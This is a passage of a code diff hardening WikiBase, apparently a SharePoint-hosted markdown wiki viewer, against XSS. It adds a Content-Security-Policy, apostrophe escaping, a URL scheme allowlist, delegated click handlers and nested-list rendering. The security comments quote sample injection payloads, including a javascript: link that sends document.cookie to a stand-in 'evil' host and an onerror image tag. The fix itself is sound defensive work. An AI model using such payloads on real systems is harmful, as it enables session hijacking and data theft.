@@ -4,6 +4,64 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#1c1c1a">
+
+  <!-- SECURITY (S12-sec): Content-Security-Policy. This is the backstop,
+       not the fix. Escaping and the URL allowlist are what actually stop
+       injection; the CSP is what limits the damage if either is ever
+       bypassed by a parser bug, turning "session compromise" into "some
+       content fails to load".
+
+       WikiBase loads nothing from anywhere but its own origin, so the
+       policy can be tight:
+         default-src 'self'   nothing external, full stop
+         connect-src          this is the line that stops exfiltration —
+                              injected script cannot POST stolen note text
+                              to an outside server. *.sharepoint.com is
+                              listed alongside 'self' deliberately: when
+                              hosted in the vault's own site these calls
+                              are same-origin, but CONFIG.siteUrl is a
+                              [PLACEHOLDER] and nothing prevents pointing
+                              it at a different site collection or hosting
+                              the shell elsewhere. Listing the tenant
+                              domain keeps that working while still
+                              blocking arbitrary outbound destinations.
+         img-src              vault attachments plus data: and blob: for
+                              local test mode's blob URLs
+         object-src 'none'    no Flash/applet/embed legacy surface
+         base-uri 'none'      blocks <base href> hijacking of relative URLs
+         form-action 'none'   the app has no forms; nothing should submit
+
+       NOT set here: frame-ancestors. It is ignored when delivered via
+       <meta> and only takes effect as a real HTTP response header, which
+       we cannot set from a file dropped in a document library. The Teams
+       tab (S11) therefore relies on SharePoint's own framing rules, as it
+       already did. Nothing is lost by omitting it, but do not add it here
+       expecting it to work.
+
+       KNOWN WEAKNESS — 'unsafe-inline' in script-src is required because
+       ~40 inline onclick attributes remain in the static markup (toolbar
+       and modal buttons). While it is present, script-src provides no
+       real XSS protection. The dynamically generated handlers, which were
+       the exploitable ones, have already moved to delegated listeners;
+       converting the remaining static handlers and dropping this keyword
+       is the last step and is tracked as follow-up, not done here.
+
+       style-src keeps 'unsafe-inline' permanently — the renderer sets
+       style="" attributes for theme colours and image widths. Inline CSS
+       is a far weaker vector than inline JS and this is a normal
+       trade-off, not a deferred fix. -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: blob: https://*.sharepoint.com;
+    font-src 'self' data:;
+    connect-src 'self' https://*.sharepoint.com https://graph.microsoft.com;
+    object-src 'none';
+    base-uri 'none';
+    form-action 'none';
+  ">
+
   <link rel="manifest" href="manifest.json">
   <title>WikiBase</title>
   <style>
@@ -785,6 +843,44 @@
     .md-task-item input { margin-top: 3px; accent-color: var(--accent); cursor: pointer; flex-shrink: 0; }
     .md-task-done { color: var(--text-muted); text-decoration: line-through; }
 
+    /* Nested lists (S3, Reader panel) — real depth instead of one flat level.
+       Every nested level (ul/ol/task, any depth) gets the same
+       left-border guide, Obsidian Minimal-style, via this one class —
+       not a special case per level. */
+    .md-list-nested {
+      margin: 2px 0 2px 2px;
+      padding-left: 1.1rem;
+      border-left: 1px solid var(--border-strong);
+    }
+    /* The row is inert — no cursor, no hover, no click handler, and
+       user-select:none so a stray double-click on the text can't
+       highlight it. Only .md-li-fold-btn (the chevron) is live. */
+    .md-li-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 5px;
+      padding: 1px 4px 1px 2px;
+      margin-left: -2px;
+      border-radius: 4px;
+      user-select: none;
+    }
+    .md-li-fold-btn {
+      display: inline-flex; align-items: center; justify-content: center;
+      width: 18px; height: 18px; flex-shrink: 0; margin-top: -1px;
+      border-radius: 4px; cursor: pointer;
+    }
+    .md-li-fold-btn:hover { background: var(--hover); }
+    .md-li-fold-btn .md-fold-icon { width: 11px; height: 11px; }
+    .md-li-spacer { width: 18px; flex-shrink: 0; }
+    .md-li-text { flex: 1; }
+    .md-li-cont { display: block; color: var(--text-muted); font-size: 0.93em; margin-top: 2px; }
+    .md-li.folded > .md-li-row .md-fold-icon { transform: rotate(-90deg); }
+    .md-li-section.folded { display: none; }
+
+    /* .md-task-item now lives on the row div, not the <li> — the <li>
+       itself just wraps the row + its optional child section, and
+       .md-task-item's existing flex/gap rules above still apply as-is. */
+
     /* Code block */
     .md-codeblock { background: var(--bg-sidebar); border: 1px solid var(--border); border-radius: var(--radius); margin: 1rem 0; overflow: hidden; }
     .md-codeblock-header { font-size: 11px; color: var(--text-muted); padding: 5px 12px; border-bottom: 1px solid var(--border); background: var(--bg-app); font-family: 'SFMono-Regular', Consolas, monospace; }
@@ -1496,7 +1592,7 @@
           <div id="search-results"><div class="rp-empty">Type to search this file and the vault.<br>⌘K / Ctrl+K</div></div>
         </div>
       </div>
-      <button id="app-version" title="View changelog" aria-label="View changelog" onclick="openChangelog()">v0.9g</button>
+      <button id="app-version" title="View changelog" aria-label="View changelog" onclick="openChangelog()">v0.9i</button>
     </aside>
 
   </div>
@@ -2150,7 +2246,14 @@ function renderSidebar() {
     const kids   = state.folderKids[folder.id]  || [];
     const loaded = state.folderLoaded[folder.id];
     const rb     = `var(--rb-${idx % 6})`;
-    const idEsc  = folder.id.replace(/'/g, "\\'");
+    // SECURITY (S12-sec): file and folder names come from SharePoint, not
+    // from us, and were previously interpolated into innerHTML unescaped.
+    // SharePoint rejects < and > in names, which is the only reason this
+    // was not directly exploitable — an accident of another system's
+    // validation, not a property of this code. Apostrophes ARE legal in
+    // SharePoint names and did break out of the old inline onclick.
+    const dnameEsc = escHtml(dname);
+    const idEsc    = escHtml(folder.id);
 
     let badge = '';
     if (state.showBadges) {
@@ -2160,9 +2263,9 @@ function renderSidebar() {
     }
 
     let out = `<div class="folder-block" style="--this-rb:${rb}">`;
-    out += `<div class="folder-row${isOpen ? ' open' : ''}" data-id="${folder.id}" onclick="toggleFolder('${idEsc}')">
+    out += `<div class="folder-row${isOpen ? ' open' : ''}" data-id="${idEsc}" data-wb-folder="${idEsc}">
       ${ICON.folder}
-      <span class="folder-name">${dname}</span>${badge}<button class="fr-add" title="New in ${dname}" aria-label="New in ${dname}" onclick="event.stopPropagation();openCreateModal('${idEsc}')">+</button>
+      <span class="folder-name">${dnameEsc}</span>${badge}<button class="fr-add" title="New in ${dnameEsc}" aria-label="New in ${dnameEsc}" data-wb-newin="${idEsc}">+</button>
     </div>`;
 
     if (isOpen) {
@@ -2176,8 +2279,8 @@ function renderSidebar() {
         files.forEach(f => {
           const dn     = displayFileName(f.name);
           const active = state.activeUrl === f.url;
-          out += `<div class="file-row${active ? ' active' : ''}" onclick="openFile('${f.url}','${dn.replace(/'/g, "\\'")}')">
-            ${ICON.file} ${dn}
+          out += `<div class="file-row${active ? ' active' : ''}" data-wb-open="${escHtml(f.url)}" data-wb-name="${escHtml(dn)}">
+            ${ICON.file} ${escHtml(dn)}
           </div>`;
         });
       }
@@ -2194,8 +2297,8 @@ function renderSidebar() {
     vaultRootFiles.forEach(f => {
       const dn     = displayFileName(f.name);
       const active = state.activeUrl === f.url;
-      html += `<div class="root-file${active ? ' active' : ''}" onclick="openFile('${f.url}','${dn.replace(/'/g,"\\'")}')">
-        ${ICON.file} ${dn}
+      html += `<div class="root-file${active ? ' active' : ''}" data-wb-open="${escHtml(f.url)}" data-wb-name="${escHtml(dn)}">
+        ${ICON.file} ${escHtml(dn)}
       </div>`;
     });
   }
@@ -2284,12 +2387,79 @@ function attachmentSrcFor(name) {
   return `${dir}/${CONFIG.attachmentsFolderName}/${encodeURIComponent(name)}`;
 }
 
+// SECURITY (S12-sec): the apostrophe escape is not cosmetic. Several
+// renderers interpolate values into single-quoted JS string literals
+// inside HTML attributes (onclick="openFile('...')"). Without &#39; a
+// value containing an apostrophe closes that string early and everything
+// after it is parsed as JavaScript — a note named  foo');alert(1)//  was
+// enough to run arbitrary code in every reader's session. The inline
+// handlers that made this exploitable have since been replaced with
+// data-attributes + delegated listeners (see wbDelegatedClick below), but
+// the escape stays as defence in depth for any future interpolation.
+//
+// IMPORTANT, and counter-intuitive: escaping does NOT make it safe to
+// interpolate a value into an inline event handler. The browser decodes
+// entities in an attribute value BEFORE handing the result to the JS
+// parser, so onclick="f('&#39;')" is parsed as f(''') — the apostrophe
+// comes back and breaks out exactly as it would have unescaped. Escaping
+// protects markup context only. The ONLY safe pattern for dynamic values
+// is a data-attribute read by a delegated listener (wbDelegatedClick),
+// which is why every handler that touched a filename now uses one. Do not
+// "fix" a future case by wrapping it in escHtml and calling it done.
 function escHtml(s) {
   return String(s)
     .replace(/&/g,'&amp;')
     .replace(/</g,'&lt;')
     .replace(/>/g,'&gt;')
-    .replace(/"/g,'&quot;');
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+// Reverse of escHtml. renderInline() escapes the whole markdown line up
+// front, so any value pulled back OUT of that escaped text to be used as
+// data rather than markup — a filename to look up in state.fileIndex, a
+// path to encodeURIComponent, a heading to turn into an anchor id — has
+// to be decoded first or the lookup silently misses. "Tips & Tricks" is
+// the canonical break: escaped it becomes "Tips &amp; Tricks", and
+// headingId() strips the semicolon to produce "h-tips-amp-tricks" instead
+// of "h-tips-tricks", so the anchor link no longer matches its heading.
+// Order matters — &amp; must be undone LAST or "&amp;lt;" double-decodes.
+function unescHtml(s) {
+  return String(s)
+    .replace(/&quot;/g,'"')
+    .replace(/&#39;/g,"'")
+    .replace(/&lt;/g,'<')
+    .replace(/&gt;/g,'>')
+    .replace(/&amp;/g,'&');
+}
+
+// SECURITY (S12-sec): URL scheme allowlist for anything a note author can
+// point a link or image at. Escaping the markdown source stops tags being
+// injected, but it does nothing about a perfectly well-formed link whose
+// href is  javascript:fetch('//evil/'+document.cookie)  — that renders as
+// an ordinary blue link and fires on click. Anything carrying an explicit
+// scheme that isn't listed here is dropped to plain text.
+//
+// Relative paths, root-relative paths and #anchors have no scheme at all
+// and always pass. obsidian: is allowed because notes authored in
+// Obsidian legitimately contain obsidian://open?vault=... deep links.
+const SAFE_URL_SCHEMES = ['http:', 'https:', 'mailto:', 'tel:', 'file:', 'obsidian:'];
+
+function safeUrl(u, opts) {
+  const raw = String(u == null ? '' : u).trim();
+  // Control characters and whitespace are stripped before the scheme is
+  // tested because browsers ignore them when resolving a URL: "java\tscript:"
+  // and "java\nscript:" both navigate to javascript:. Testing the raw
+  // string would let either past.
+  const probe = raw.replace(/[\x00-\x20]/g, '').toLowerCase();
+  const m = probe.match(/^([a-z][a-z0-9+.\-]*):/);
+  if (!m) return raw;                                  // no scheme — relative or anchor
+  if (SAFE_URL_SCHEMES.includes(m[1] + ':')) return raw;
+  // Inline image data is harmless in an <img> (scripts never execute from
+  // one) EXCEPT svg+xml, which is deliberately excluded. Never allowed for
+  // links, where data:text/html is a full same-origin document.
+  if (opts && opts.image && /^data:image\/(png|jpe?g|gif|webp|avif);/.test(probe)) return raw;
+  return '';
 }
 
 // Shared broken-image fallback. Both image renderers used to build this
@@ -2363,13 +2533,33 @@ const CALLOUT_META = {
 
 // ── Inline renderer ──────────────────────────────────────────────
 function renderInline(text) {
-  let s = text;
+  // SECURITY (S12-sec): escape FIRST, parse second. This function used to
+  // start with `let s = text` and hand the result straight to innerHTML,
+  // which meant any HTML typed into a .md file was rendered as live markup
+  // — an  <img src=x onerror=...>  in a note executed for every reader who
+  // opened it, with their SharePoint session. Escaping up front makes the
+  // source unambiguously text; the markdown syntax this function looks for
+  // (* _ ` [ ] ~ =) is untouched by escaping, so parsing is unaffected.
+  //
+  // Consequence: raw HTML in notes no longer renders, by design. Obsidian
+  // permits HTML but sanitizes it; we take the stricter line because a
+  // read-only wiki has no need for author-supplied markup. Anything pulled
+  // back out of `s` for use as DATA (lookups, ids, URLs) must go through
+  // unescHtml() first — see the comment on that function.
+  //
+  // Note the ordering constraint this creates: every value interpolated
+  // below is ALREADY escaped, so calling escHtml() on it again would
+  // double-encode ("&" displaying as "&amp;"). Values that originate
+  // outside `s` — a URL from state.fileIndex, for instance — still need
+  // escaping, and are marked where they occur.
+  let s = escHtml(text);
 
   // 1. Protect inline code from further processing
   const codeSlots = [];
   s = s.replace(/`([^`\n]+)`/g, (_, code) => {
     const idx = codeSlots.length;
-    codeSlots.push(`<code class="md-code">${escHtml(code)}</code>`);
+    // `code` is already escaped by the line above — do not escape twice.
+    codeSlots.push(`<code class="md-code">${code}</code>`);
     return `\x00C${idx}\x00`;
   });
 
@@ -2395,23 +2585,35 @@ function renderInline(text) {
   // matches isImageExt() and falls through to the note-embed stub.
   s = s.replace(/!\[\[([^\]]+)\]\]/g, (_, raw) => {
     const [namePart, sizePart] = raw.split('|');
-    const name = namePart.trim();
+    const name = namePart.trim();        // escaped — safe for markup
+    const rawName = unescHtml(name);     // decoded — safe for URL building
     const size = (sizePart || '').trim();
     if (isImageExt(name)) {
-      const src = attachmentSrcFor(name);
+      // attachmentSrcFor() runs encodeURIComponent internally, so it must
+      // be given the DECODED name — feeding it "Q1 &amp; Q2.png" would
+      // encode the entity itself and request a file that doesn't exist.
+      const src = safeUrl(attachmentSrcFor(rawName), { image: true });
       // No src attribute at all when empty (local mode, pre-hydration) —
       // src="" is its own foot-gun, browsers treat it as "reload the
       // current page" and that would error too.
-      const srcAttr = src ? ` src="${src}"` : '';
+      const srcAttr = src ? ` src="${escHtml(src)}"` : '';
       const widthAttr = /^\d+$/.test(size) ? ` width="${size}"` : '';
-      return slot(`<img class="md-img" data-wb-asset="${escHtml(name)}"${srcAttr} alt="${escHtml(name)}"${widthAttr} onerror="wbImgError(this)">`);
+      return slot(`<img class="md-img" data-wb-asset="${name}"${srcAttr} alt="${name}"${widthAttr} onerror="wbImgError(this)">`);
     }
-    return slot(buildEmbedStub(name, true));
+    // buildEmbedStub escapes internally and takes a RAW name (the block
+    // renderer calls it with unparsed text), so hand it the decoded form.
+    return slot(buildEmbedStub(rawName, true));
   });
 
   // Standard image: ![alt](url)
   s = s.replace(/!\[([^\]]*)\]\(([^)\n]+)\)/g, (_, alt, src) => {
-    return slot(`<img class="md-img" src="${escHtml(src)}" alt="${escHtml(alt)}">`);
+    // alt and src are already escaped; src additionally passes the scheme
+    // allowlist. A blocked scheme renders the alt text alone rather than a
+    // broken image, so the reader sees the caption and nothing silently
+    // disappears from the page.
+    const clean = safeUrl(src.trim(), { image: true });
+    if (!clean) return slot(`<span class="md-img-err">${alt}</span>`);
+    return slot(`<img class="md-img" src="${clean}" alt="${alt}">`);
   });
 
   // Wiki links: [[...]]
@@ -2436,20 +2638,24 @@ function renderInline(text) {
       display = target || (a || '').trim();
     }
 
-    // Same-page anchor
+    // Same-page anchor. headingId() must see the DECODED heading text —
+    // it strips non-word characters, so "&amp;" would survive as the word
+    // "amp" and produce an id that never matches the heading it points at.
     if (!target) {
-      const hid = headingId(anchor.replace('#', ''));
-      return slot(`<a class="md-ilink" href="${escHtml(anchor)}" onclick="scrollToAnchor(event,'${escHtml(hid)}')">${escHtml(display)}</a>`);
+      const hid = headingId(unescHtml(anchor.replace('#', '')));
+      return slot(`<a class="md-ilink" href="${anchor}" data-wb-anchor="${escHtml(hid)}">${display}</a>`);
     }
 
-    const key = target.toLowerCase().replace(/\.md$/,'');
+    const key = unescHtml(target).toLowerCase().replace(/\.md$/,'');
     const url = state.fileIndex[key];
     if (url) {
-      const anchorAttr = anchor ? ` data-anchor="${escHtml(anchor)}"` : '';
-      return slot(`<a class="md-ilink" onclick="openFile('${url}','${escHtml(target)}')"${anchorAttr}>${escHtml(display)}</a>`);
+      const anchorAttr = anchor ? ` data-anchor="${anchor}"` : '';
+      // url comes from the file index, not from the escaped markdown, so
+      // it still needs escaping here.
+      return slot(`<a class="md-ilink" data-wb-open="${escHtml(url)}" data-wb-name="${target}"${anchorAttr}>${display}</a>`);
     }
     // Unresolved — note may be in an unexpanded folder
-    return slot(`<span class="md-ilink-dead" title="Note not yet loaded or not found">${escHtml(display)}</span>`);
+    return slot(`<span class="md-ilink-dead" title="Note not yet loaded or not found">${display}</span>`);
   });
 
   // Standard Markdown links: [text](url)
@@ -2458,28 +2664,40 @@ function renderInline(text) {
     // .md link → internal nav
     if (href.match(/\.md($|#)/i)) {
       const [path, frag] = href.split('#');
-      const noteName = decodeURIComponent(path.replace(/\.md$/i,'').split('/').pop());
+      // decodeURIComponent needs the decoded path for the same reason
+      // attachmentSrcFor does — "%20" is URI encoding, "&amp;" is not.
+      let noteName;
+      try {
+        noteName = decodeURIComponent(unescHtml(path).replace(/\.md$/i,'').split('/').pop());
+      } catch (_) {
+        noteName = unescHtml(path).replace(/\.md$/i,'').split('/').pop();
+      }
       const url = state.fileIndex[noteName.toLowerCase()];
       if (url) {
-        const anchorAttr = frag ? ` data-anchor="#${escHtml(frag)}"` : '';
-        return slot(`<a class="md-ilink" onclick="openFile('${url}','${escHtml(noteName)}')"${anchorAttr}>${escHtml(text)}</a>`);
+        const anchorAttr = frag ? ` data-anchor="#${frag}"` : '';
+        return slot(`<a class="md-ilink" data-wb-open="${escHtml(url)}" data-wb-name="${escHtml(noteName)}"${anchorAttr}>${text}</a>`);
       }
     }
     // Same-page anchor
     if (href.startsWith('#')) {
-      const hid = headingId(href.replace('#',''));
-      return slot(`<a class="md-ilink" href="${escHtml(href)}" onclick="scrollToAnchor(event,'${hid}')">${escHtml(text)}</a>`);
+      const hid = headingId(unescHtml(href.replace('#','')));
+      return slot(`<a class="md-ilink" href="${href}" data-wb-anchor="${escHtml(hid)}">${text}</a>`);
     }
     // Folder/file-share link (file:// UNC or drive path) — browsers can't
     // open a native Explorer/Finder window from a page link, and Obsidian's
     // own file:// syntax doesn't survive a plain click here, so this copies
     // a cleaned path to the clipboard instead of attempting to navigate.
     if (/^file:\/\//i.test(href)) {
-      const path = decodeFileLinkPath(href);
-      return slot(`<a class="md-ilink wb-folder-link" data-path="${escHtml(path)}" title="Copy folder path to clipboard">${escHtml(text)}</a>`);
+      const path = decodeFileLinkPath(unescHtml(href));
+      return slot(`<a class="md-ilink wb-folder-link" data-path="${escHtml(path)}" title="Copy folder path to clipboard">${text}</a>`);
     }
-    // External
-    return slot(`<a class="md-ilink" href="${escHtml(href)}" target="_blank" rel="noopener">${escHtml(text)}</a>`);
+    // External. safeUrl() drops javascript:, data:text/html, vbscript: and
+    // any other scheme not on the allowlist; a blocked link degrades to its
+    // own label as plain text, so the reader still sees the words but has
+    // nothing clickable. rel="noopener" was already correct — kept.
+    const clean = safeUrl(href);
+    if (!clean) return slot(`<span class="md-ilink-dead" title="Link removed — unsupported or unsafe URL scheme">${text}</span>`);
+    return slot(`<a class="md-ilink" href="${clean}" target="_blank" rel="noopener noreferrer">${text}</a>`);
   });
 
   // 2. Bold + italic (must come before bold/italic alone)
@@ -2578,13 +2796,92 @@ document.addEventListener('click', (e) => {
   copyFolderPath(link.dataset.path || '', link);
 });
 
+// SECURITY (S12-sec): single delegated handler for every click target that
+// used to carry an inline onclick built by string interpolation. Those
+// handlers were the reason a stray apostrophe in a filename could become
+// executable JavaScript: the value was concatenated into source code. Here
+// the value arrives as a DOM attribute, which is data and can never be
+// parsed as code no matter what characters it contains.
+//
+// Also a prerequisite for tightening the CSP — every inline handler
+// removed is one step closer to dropping 'unsafe-inline' from script-src.
+function wbDelegatedClick(e) {
+  // Sidebar "+" must be checked before the folder row it sits inside,
+  // and must not also toggle that folder — this is the stopPropagation()
+  // the old inline handler did.
+  const newIn = e.target.closest('[data-wb-newin]');
+  if (newIn) {
+    e.preventDefault();
+    e.stopPropagation();
+    openCreateModal(newIn.dataset.wbNewin);
+    return;
+  }
+  const folderRow = e.target.closest('[data-wb-folder]');
+  if (folderRow) {
+    toggleFolder(folderRow.dataset.wbFolder);
+    return;
+  }
+  const opener = e.target.closest('[data-wb-open]');
+  if (opener) {
+    e.preventDefault();
+    // Same-file link, any form — [[File#Heading]] / [[File#Heading|txt]]
+    // pointing at the file already open used to still call openFile()
+    // here and force a full reload+rescroll, even though [[#Heading]]
+    // (no file name) already scrolled in place. If the resolved target
+    // is the file that's already open, treat it the same way: scroll,
+    // don't reload.
+    if (opener.dataset.wbOpen === state.activeUrl) {
+      if (opener.dataset.anchor) {
+        scrollToAnchor(e, headingId(opener.dataset.anchor.replace('#', '')));
+      }
+      return;
+    }
+    openFile(opener.dataset.wbOpen, opener.dataset.wbName || '');
+    return;
+  }
+  const anchorEl = e.target.closest('[data-wb-anchor]');
+  if (anchorEl) {
+    scrollToAnchor(e, anchorEl.dataset.wbAnchor || '');
+    return;
+  }
+  const ext = e.target.closest('[data-wb-external]');
+  if (ext) {
+    e.preventDefault();
+    window.open(ext.dataset.wbExternal, '_blank', 'noopener,noreferrer');
+    return;
+  }
+  const outFold = e.target.closest('[data-wb-outfold]');
+  if (outFold) {
+    e.preventDefault();
+    e.stopPropagation();
+    toggleOutlineHeading(outFold.dataset.wbOutfold);
+    return;
+  }
+  const outJump = e.target.closest('[data-wb-outjump]');
+  if (outJump) {
+    e.preventDefault();
+    scrollToHeading(outJump.dataset.wbOutjump);
+    return;
+  }
+  const closeCmt = e.target.closest('[data-wb-closecmt]');
+  if (closeCmt) {
+    e.preventDefault();
+    e.stopPropagation();
+    closeCommentInReview(closeCmt.dataset.wbClosecmt, closeCmt.dataset.wbName || '',
+                         Number(closeCmt.dataset.wbIdx));
+  }
+}
+document.addEventListener('click', wbDelegatedClick);
+
 // ── Embed stub builder ───────────────────────────────────────────
+// Takes a RAW (unescaped) name and escapes internally — callers on both
+// the inline and block paths normalise to raw before calling.
 function buildEmbedStub(name, inline) {
   const key = name.toLowerCase().replace(/\.md$/,'');
   const url = state.fileIndex[key];
   const tag = inline ? 'span' : 'div';
   if (url) {
-    return `<${tag} class="md-embed-stub" onclick="openFile('${url}','${escHtml(name)}')">${ICON.embedFile}<span class="md-embed-stub-name">${escHtml(name)}</span><span class="md-embed-stub-sub">embedded note</span><span class="md-embed-stub-open">Open →</span></${tag}>`;
+    return `<${tag} class="md-embed-stub" data-wb-open="${escHtml(url)}" data-wb-name="${escHtml(name)}">${ICON.embedFile}<span class="md-embed-stub-name">${escHtml(name)}</span><span class="md-embed-stub-sub">embedded note</span><span class="md-embed-stub-open">Open →</span></${tag}>`;
   }
   return `<${tag} class="md-embed-stub">${ICON.embedFile}<span class="md-embed-stub-name">${escHtml(name)}</span><span class="md-embed-stub-sub">embedded note — not found</span></${tag}>`;
 }
@@ -2710,12 +3007,17 @@ function parseBlocks(lines) {
       continue;
     }
 
-    // List (ul, ol, task)
+    // List (ul, ol, task). Continuation check recognizes a tab OR 2+
+    // spaces of indentation — tab-only continuation lines (no marker)
+    // used to fail this (space-only regex) and fall out of the list
+    // block as their own paragraph.
     if (trimmed.match(/^[-*+] /) || trimmed.match(/^\d+\. /)) {
       const listLines = [];
       while (i < lines.length) {
         const t = lines[i].trimStart();
-        if (t.match(/^[-*+] /) || t.match(/^\d+\. /) || (listLines.length && lines[i].match(/^ {2,}\S/))) {
+        const isMarker = t.match(/^[-*+] /) || t.match(/^\d+\. /);
+        const isContinuation = listLines.length && /^(\t| {2,})\S/.test(lines[i]);
+        if (isMarker || isContinuation) {
           listLines.push(lines[i]);
           i++;
         } else { break; }
@@ -2784,6 +3086,109 @@ function renderBlockTree(blocks, seenIds) {
   return html;
 }
 
+// ── Nested list rendering (S3, Reader panel) ───────────────────────
+// Depth per item — a tab counts one level, and every run of 2 spaces
+// counts one level. No distinction by marker type (bullet/number/
+// checkbox all nest the same way): this matches Obsidian itself, which
+// nests every list type off the same indent-relative-to-parent rule
+// regardless of "Indent using tabs" / tab-size settings.
+function listIndentDepth(ws) {
+  let depth = 0, spaces = 0;
+  for (const ch of ws) {
+    if (ch === '\t') { depth++; spaces = 0; }
+    else if (ch === ' ') { spaces++; if (spaces === 2) { depth++; spaces = 0; } }
+  }
+  return depth;
+}
+
+// One container per level (root or nested) — a level becomes a task
+// list if any item in it is a checkbox, otherwise ol/ul follows the
+// first item's marker. Applied per level (not once for the whole
+// block) so mixed nesting, e.g. a checkbox under a bullet, still
+// renders each level with its own correct list type.
+function renderListLevel(nodes, isRoot) {
+  const hasTask = nodes.some(n => n.kind === 'task');
+  const isOl    = !hasTask && nodes[0].kind === 'ol';
+  const tag     = isOl ? 'ol' : 'ul';
+  const cls     = hasTask ? 'md-task-list' : (isOl ? 'md-ol' : 'md-ul');
+  const nestCls = isRoot ? '' : ' md-list-nested';
+  return `<${tag} class="${cls}${nestCls}">${nodes.map(n => renderListItem(n)).join('')}</${tag}>`;
+}
+
+function renderListItem(n) {
+  const hasKids  = n.children.length > 0;
+  // Only the chevron is a click target — the row/text carry no handler
+  // and no cursor, so clicking or double-clicking the text does nothing
+  // (see .md-li-row's user-select:none, below, for why it also can't
+  // highlight). Click folds just this item's direct children, same
+  // pattern as heading fold; double-click folds its whole subtree, all
+  // levels down — available at ANY depth with children, not just top.
+  const foldEl = hasKids
+    ? `<span class="md-li-fold-btn" onclick="liChevronClick(event, this)" ondblclick="liChevronDblClick(event, this)">${ICON.foldChevron}</span>`
+    : '<span class="md-li-spacer"></span>';
+  const contHtml = n.cont.length ? `<span class="md-li-cont">${renderInline(n.cont.join(' '))}</span>` : '';
+
+  let rowInner;
+  if (n.kind === 'task') {
+    const taskIdx = mdTaskCounter++;
+    rowInner = `<input type="checkbox"${n.done ? ' checked' : ''} onchange="toggleTaskCheckbox(this, ${taskIdx})"><span class="md-li-text${n.done ? ' md-task-done' : ''}">${renderInline(n.content)}${contHtml}</span>`;
+  } else {
+    rowInner = `<span class="md-li-text">${renderInline(n.content)}${contHtml}</span>`;
+  }
+
+  const rowCls = n.kind === 'task' ? 'md-li-row md-task-item' : 'md-li-row';
+  const liCls  = hasKids ? 'md-li md-li-parent' : 'md-li';
+  return `<li class="${liCls}">
+<div class="${rowCls}">${foldEl}${rowInner}</div>
+${hasKids ? `<div class="md-li-section">${renderListLevel(n.children, false)}</div>` : ''}
+</li>`;
+}
+
+// Click/dblclick disambiguation. e.detail>1 alone only skips the SECOND
+// click of a double-click — the first click still fires immediately, so
+// a double-click used to fold one level and then fold the whole subtree
+// on top of that. Fix: delay the single-click action; if a second click
+// (dblclick) lands within the window, cancel it and let dblclick own
+// the gesture entirely.
+let liClickTimer = null;
+const LI_DBLCLICK_WINDOW = 220; // ms
+
+function liChevronClick(e, btn) {
+  if (liClickTimer) { clearTimeout(liClickTimer); liClickTimer = null; return; }
+  liClickTimer = setTimeout(() => { liClickTimer = null; toggleLiFold(btn); }, LI_DBLCLICK_WINDOW);
+}
+
+function liChevronDblClick(e, btn) {
+  if (liClickTimer) { clearTimeout(liClickTimer); liClickTimer = null; }
+  toggleLiSubtree(btn);
+}
+
+// Collapse/expand just this item's direct section, exactly like a
+// heading fold.
+function toggleLiFold(btn) {
+  const li = btn.closest('.md-li');
+  const section = li.querySelector(':scope > .md-li-section');
+  if (!section) return;
+  const folded = li.classList.toggle('folded');
+  section.classList.toggle('folded', folded);
+}
+
+// Fold/unfold this item's entire subtree at once, all levels down —
+// works at any depth, not just top-level — overriding whatever fold
+// state individual descendants were in.
+function toggleLiSubtree(btn) {
+  const li = btn.closest('.md-li');
+  const willFold = !li.classList.contains('folded');
+  (function apply(el) {
+    el.classList.toggle('folded', willFold);
+    const sec = el.querySelector(':scope > .md-li-section');
+    if (sec) {
+      sec.classList.toggle('folded', willFold);
+      sec.querySelectorAll(':scope > ul > .md-li, :scope > ol > .md-li').forEach(apply);
+    }
+  })(li);
+}
+
 // ── Single block renderer ─────────────────────────────────────────
 function renderSingleBlock(block, seenIds) {
   switch (block.type) {
@@ -2824,39 +3229,45 @@ function renderSingleBlock(block, seenIds) {
     }
 
     case 'list': {
-      const items = block.lines.map(l => {
+      // Parse each line into a marker item (kind/content/depth). A
+      // marker-less indented line (tab-indented continuation, e.g. a
+      // wrapped note under a bullet) attaches onto the previous item
+      // as continuation text instead of being silently dropped.
+      const items = [];
+      block.lines.forEach(l => {
         const tM = l.match(/^(\s*)[-*+] \[([ xX])\] (.*)/);
         const uM = l.match(/^(\s*)[-*+] (.*)/);
         const oM = l.match(/^(\s*)\d+\. (.*)/);
-        if (tM) return { kind: 'task', done: tM[2].toLowerCase() === 'x', content: tM[3], indent: tM[1].length };
-        if (uM) return { kind: 'ul',   content: uM[2], indent: uM[1].length };
-        if (oM) return { kind: 'ol',   content: oM[2], indent: oM[1].length };
-        return null;
-      }).filter(Boolean);
+        if (tM) { items.push({ kind: 'task', done: tM[2].toLowerCase() === 'x', content: tM[3], depth: listIndentDepth(tM[1]), cont: [] }); return; }
+        if (uM) { items.push({ kind: 'ul',   content: uM[2], depth: listIndentDepth(uM[1]), cont: [] }); return; }
+        if (oM) { items.push({ kind: 'ol',   content: oM[2], depth: listIndentDepth(oM[1]), cont: [] }); return; }
+        if (items.length) items[items.length - 1].cont.push(l.trim());
+      });
 
       if (!items.length) return '';
 
-      // If any tasks exist, render as task list
-      if (items.some(it => it.kind === 'task')) {
-        const liHtml = items.map(it => {
-          if (it.kind === 'task') {
-            const taskIdx = mdTaskCounter++;
-            return `<li class="md-task-item"><input type="checkbox"${it.done ? ' checked' : ''} onchange="toggleTaskCheckbox(this, ${taskIdx})"><span class="${it.done ? 'md-task-done' : ''}">${renderInline(it.content)}</span></li>`;
-          }
-          return `<li class="md-task-item"><span>${renderInline(it.content)}</span></li>`;
-        }).join('');
-        return `<ul class="md-task-list">${liHtml}</ul>`;
-      }
+      // Build a tree from the flat depth-tagged items — a stack of
+      // "current open ancestor at each depth", same approach as the
+      // heading outline uses.
+      const root = [];
+      const stack = [{ depth: -1, children: root }];
+      items.forEach(it => {
+        while (stack.length && stack[stack.length - 1].depth >= it.depth) stack.pop();
+        const parent = stack[stack.length - 1].children;
+        const node = { ...it, children: [] };
+        parent.push(node);
+        stack.push({ depth: it.depth, children: node.children });
+      });
 
-      const isOl = items[0].kind === 'ol';
-      const tag  = isOl ? 'ol' : 'ul';
-      const cls  = isOl ? 'md-ol' : 'md-ul';
